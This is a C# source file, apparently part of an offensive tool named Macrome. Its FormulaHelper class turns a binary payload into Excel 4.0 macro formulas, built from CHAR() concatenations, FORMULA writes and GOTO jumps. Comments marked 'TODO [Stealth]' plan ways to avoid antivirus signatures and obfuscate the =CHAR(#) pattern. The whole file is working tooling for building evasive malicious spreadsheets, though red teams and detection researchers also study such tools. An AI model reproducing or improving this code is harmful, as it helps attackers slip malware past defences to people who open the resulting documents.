using System;
using System.Collections.Generic;
using System.Linq;
using b2xtranslator.Spreadsheet.XlsFileFormat;
using b2xtranslator.Spreadsheet.XlsFileFormat.Ptg;
using b2xtranslator.Spreadsheet.XlsFileFormat.Records;
using b2xtranslator.xls.XlsFileFormat.Ptg;
using b2xtranslator.xls.XlsFileFormat.Records;
using b2xtranslator.xls.XlsFileFormat.Structures;

namespace Macrome
{
    public static class FormulaHelper
    {
        /// <summary>
        /// Convert a binary payload into a series of cells representing the binary data.
        /// Can be iterated across as described in https://outflank.nl/blog/2018/10/06/old-school-evil-excel-4-0-macros-xlm/
        /// </summary>
        /// <param name="payload"></param>
        /// <returns></returns>
        public static List<string> BuildPayloadMacros(byte[] payload)
        {
            //Can technically go up to 255 bytes per line, but this seems to fail if we don't play it safe
            int maxLineSize = 100; 
            List<string> macros = new List<string>();
            string curMacro = "=";
            int curOffset = 0;
            bool lastCharIsPrintable = false;
            foreach (byte b in payload)
            {
                char c = (char) b;
                var isPrintable = (!Char.IsControl(c) || Char.IsWhiteSpace(c)) && (int)c < 0x80;

                if (isPrintable && curMacro.Length > 1 && !lastCharIsPrintable)
                {
                    curMacro += "&\"";
                }
                else if (!isPrintable && curMacro.Length > 1 && lastCharIsPrintable)
                {
                    curMacro += "\"&";
                }
                else if (!isPrintable && !lastCharIsPrintable && curMacro.Length > 1)
                {
                    curMacro += "&";
                }
                else if (isPrintable && !lastCharIsPrintable)
                {
                    curMacro += "\"";
                }


                if (isPrintable)
                {
                    lastCharIsPrintable = true;
                    curMacro += c;
                }
                else
                {
                    lastCharIsPrintable = false;
                    curMacro += string.Format("CHAR({0})", (int) b);
                }

                curOffset += 1;
                if (curOffset % maxLineSize == 0)
                {
                    if (lastCharIsPrintable)
                    {
                        curMacro += "\"";
                    }

                    macros.Add(curMacro);
                    curMacro = "=";
                    lastCharIsPrintable = false;
                }
            }

            if (curMacro.Length > 1)
            {
                if (lastCharIsPrintable)
                {
                    curMacro += "\"";
                }
                macros.Add(curMacro);
            }
            macros.Add("END");

            return macros;
        }

        private static Stack<AbstractPtg> GetGotoForCell(int rw, int col)
        {
            Stack<AbstractPtg> ptgStack = new Stack<AbstractPtg>();
            ptgStack.Push(new PtgRef(rw, col, false, false));
            ptgStack.Push(new PtgFuncVar(FtabValues.GOTO, 1, AbstractPtg.PtgDataType.VALUE));
            return ptgStack;
        }

        public static Formula GetGotoFormulaForCell(int rw, int col, int dstRw, int dstCol, int ixfe = 15)
        {
            Cell curCell = new Cell(rw, col, ixfe);
            Stack<AbstractPtg> ptgStack = GetGotoForCell(dstRw, dstCol);
            Formula gotoFormula = new Formula(curCell, FormulaValue.GetEmptyStringFormulaValue(), true, new CellParsedFormula(ptgStack));
            return gotoFormula;
        }
        

        public static Stack<AbstractPtg> GetCharPtgForInt(ushort charInt)
        {
            //TODO [Stealth] Go back to using PtgFunc instead of PtgFuncVar to avoid easy signature
            Stack<AbstractPtg> ptgStack = new Stack<AbstractPtg>();

            Random r = new Random();

            ptgStack.Push(new PtgInt(charInt));
            ptgStack.Push(new PtgFuncVar(FtabValues.CHAR, 1, AbstractPtg.PtgDataType.VALUE));
            ptgStack.Push(new PtgRef(r.Next(1000,2000), r.Next(0x10,0x100),false,false,AbstractPtg.PtgDataType.VALUE));
            ptgStack.Push(new PtgConcat());
            return ptgStack;
        }

        public static List<BiffRecord> ConvertStringsToRecords(List<string> strings, int rwStart, int colStart, int dstRwStart, int dstColStart,
            int ixfe = 15)
        {
            List<BiffRecord> formulaList = new List<BiffRecord>();

            int curRow = rwStart;
            int curCol = colStart;

            int dstCurRow = dstRwStart;
            int dstCurCol = dstColStart;

            foreach (string str in strings)
            {
                List<BiffRecord> stringFormulas = ConvertStringToFormulas(str, curRow, curCol, dstCurRow, dstCurCol, ixfe);
                //Generates N records, and then saves space for the extra cell where the generated formula is dropped
                curRow += stringFormulas.Count;
                dstCurRow += 1;

                formulaList.AddRange(stringFormulas);
            }

            return formulaList;
        }

        public static List<BiffRecord> ConvertStringToFormulas(string str, int rwStart, int colStart, int dstRw, int dstCol, int ixfe = 15)
        {
            List<BiffRecord> formulaList = new List<BiffRecord>();
            List<Cell> createdCells = new List<Cell>();

            int curRow = rwStart;
            int curCol = colStart;

            //TODO [Stealth] Perform additional operations to obfuscate static =CHAR(#) signature
            foreach (char c in str)
            {
                Stack<AbstractPtg> ptgStack = GetCharPtgForInt(Convert.ToUInt16(c));
                Cell curCell = new Cell(curRow, curCol, ixfe);
                createdCells.Add(curCell);
                Formula charFrm = new Formula(curCell, FormulaValue.GetEmptyStringFormulaValue(), true, new CellParsedFormula(ptgStack));
                formulaList.Add(charFrm);
                curRow += 1;
            }


            Formula concatFormula = BuildConcatCellsFormula(createdCells, curRow, curCol);
            formulaList.Add(concatFormula);
            curRow += 1;

            Stack<AbstractPtg> formulaPtgStack = new Stack<AbstractPtg>();

            PtgRef srcCell = new PtgRef(curRow - 1, curCol, false, false, AbstractPtg.PtgDataType.VALUE);
            formulaPtgStack.Push(srcCell);

            PtgRef destCell = new PtgRef(dstRw, dstCol, false, false);
            formulaPtgStack.Push(destCell);

            PtgFuncVar funcVar = new PtgFuncVar(CetabValues.FORMULA, 2);
            formulaPtgStack.Push(funcVar);

            Formula formula = new Formula(new Cell(curRow, curCol, ixfe), FormulaValue.GetEmptyStringFormulaValue(), true, new CellParsedFormula(formulaPtgStack));
            formulaList.Add(formula);

            return formulaList;
        }

        
        public static Formula BuildConcatCellsFormula(List<Cell> cells, int frmRow, int frmCol, int ixfe = 15)
        {
            Stack<AbstractPtg> ptgStack = new Stack<AbstractPtg>();

            Cell firstCell = cells.First();
            List<Cell> remainingCells = cells.TakeLast(cells.Count - 1).ToList();
            PtgRef cellRef = new PtgRef(firstCell.Rw, firstCell.Col, false, false, AbstractPtg.PtgDataType.VALUE);
            ptgStack.Push(cellRef);

            //TODO [Stealth] Use alternate concat methods beyond PtgConcat, for example CONCATENATE via PtgFuncVar
            foreach (Cell cell in remainingCells)
            {
                PtgConcat ptgConcat = new PtgConcat();
                PtgRef appendedCellRef = new PtgRef(cell.Rw, cell.Col, false, false, AbstractPtg.PtgDataType.VALUE);
                ptgStack.Push(appendedCellRef);
                ptgStack.Push(ptgConcat);
            }

            Formula f = new Formula(new Cell(frmRow, frmCol, ixfe), FormulaValue.GetEmptyStringFormulaValue(), true, new CellParsedFormula(ptgStack));
            return f;
        }

       public static List<BiffRecord> GetFormulaRecords(Formula f)
        {
            if (f.RequiresStringRecord() == false)
            {
                return new List<BiffRecord>() {f};
            }
            
            return new List<BiffRecord>()
            {
                f, 
                new STRING("\u0000", true)
            };
        }
    }
}
